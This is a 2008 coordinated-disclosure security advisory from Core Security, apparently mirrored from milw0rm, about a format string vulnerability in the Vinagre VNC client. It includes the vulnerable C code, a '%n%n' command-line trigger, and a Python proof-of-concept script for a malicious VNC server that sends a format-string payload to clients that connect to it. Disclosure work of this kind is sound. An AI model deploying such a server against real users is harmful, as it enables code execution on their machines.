@@ -1,0 +1,229 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+      Core Security Technologies - CoreLabs Advisory
+           http://www.coresecurity.com/corelabs/
+
+Vinagre show_error() format string vulnerability
+
+
+
+1. *Advisory Information*
+
+Title: Vinagre show_error() format string vulnerability
+Advisory ID: CORE-2008-1127
+Advisory URL: http://www.coresecurity.com/content/vinagre-format-string
+Date published: 2008-12-09
+Date of last update: 2008-12-09
+Vendors contacted: Vinagre team
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Format string
+Remotely Exploitable: Yes
+Locally Exploitable: No
+Bugtraq ID: 32682
+CVE Name: N/A
+
+
+3. *Vulnerability Description*
+
+Vinagre [1] is a VNC client for the GNOME Desktop. A format string error
+has been found on the 'vinagre_utils_show_error()' function that can be
+exploited via commands issued from a malicious server containing format
+string specifiers on the VNC name.
+
+In a web based attack scenario, the user would be required to connect to
+a malicious server. Successful exploitation would then allow the
+attacker to execute arbitrary code with the privileges of the Vinagre user.
+
+
+4. *Vulnerable packages*
+
+   . Vinagre 2.24.1 and previous versions
+
+
+5. *Non-vulnerable packages*
+
+   . Vinagre 2.24.2
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+The Vinagre team has released a fixed version, available at
+http://ftp.acc.umu.se/pub/GNOME/sources/vinagre/2.24/vinagre-2.24.2.tar.gz
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Alfredo Ortega from
+Core Security Technologies.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+The function 'vinagre_utils_show_error()' on 'src/vinagre-utils.c' follows:
+
+/-----------
+
+57  void
+58  vinagre_utils_show_error (const gchar *message, GtkWindow *parent)
+59  {
+60    GtkWidget *d;
+61
+62    d = gtk_message_dialog_new (parent,
+63              GTK_DIALOG_MODAL | GTK_DIALOG_DESTROY_WITH_PARENT,
+64              GTK_MESSAGE_ERROR,
+65              GTK_BUTTONS_CLOSE,
+66              message);
+....
+
+- -----------/
+
+ Here, the "message" string is the format specifier for the function
+'gtk_message_dialog_new()', but may be controlled by the user in many
+ways. The simplest is the invocation of vinagre via a command line, Ex.:
+
+/-----------
+
+~$vinagre %n%n
+- -----------/
+
+ But the vulnerability can also be triggered remotely via a malicious
+vnc server.
+
+
+8.1. *Proof Of Concept*
+
+The following python script implements a basic vnc server that triggers
+the vulnerability:
+
+/-----------
+
+##
+## Gnome Vinagre format string PoC VNC SERVER
+##
+
+import socket
+import struct
+
+#create an INET, STREAMing socket
+serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+#bind the socket to a public host,
+# and a well-known port
+serversocket.bind(("0.0.0.0", 5900))
+
+#become a server socket
+serversocket.listen(5)
+
+while 1:
+  #accept connections from outside
+  (clientsocket, address) = serversocket.accept()
+  print "accept"
+
+  # version handshake
+  clientsocket.send("RFB 003.008\n")
+  resp=clientsocket.recv(100)
+  print resp
+
+  # security types (none)	
+  clientsocket.send("\x01\x01")
+  resp=clientsocket.recv(100)
+  if resp=="\x01":
+    print "security: none"
+    clientsocket.send("\x00\x00\x00\x00") #OK
+  else: exit(-1)
+
+  # share desktop flag?
+  resp=clientsocket.recv(100)
+
+  #framebuffer parameters
+
+clientsocket.send("\x02\xd0\x01\x90\x20\x20\x00\x01\x00\xff\x00\xff\x00\xff\x10\x08\x00\x00\x00\x00\x00\x00\x00\x04%n%n")
+#OK
+
+  resp=clientsocket.recv(100)
+  clientsocket.close()
+
+- -----------/
+
+
+
+
+9. *Report Timeline*
+
+. 2008-12-01: Core Security Technologies notifies the Vinagre team of
+the vulnerability.
+. 2008-12-02: Vinagre team asks Core for a technical description of the
+vulnerability.
+. 2008-12-02: Technical details sent to Vinagre team by Core.
+. 2008-12-02: Vinagre team notifies Core this issue has been fixed in
+the development branch, and that a new version will be available soon.
+. 2008-12-05: Core asks Vinagre team if the new version is available.
+. 2008-12-05: Vinagre team releases the Vinagre 2.24.2 version, which
+fixes this issue.
+. 2008-12-09: The advisory CORE-2008-1127 is published.
+
+
+10. *References*
+
+[1] http://projects.gnome.org/vinagre/.
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://www.coresecurity.com/corelabs.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2008 Core Security
+Technologies and (c) 2008 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.7 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFJPsvQyNibggitWa0RAoZHAJ9RQxrboOG+3oWfK4qH8pMoZEELHgCeOyVJ
+bVIpD2b1TEob7GKuEfmBAYs=
+=31Hp
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2008-12-09]
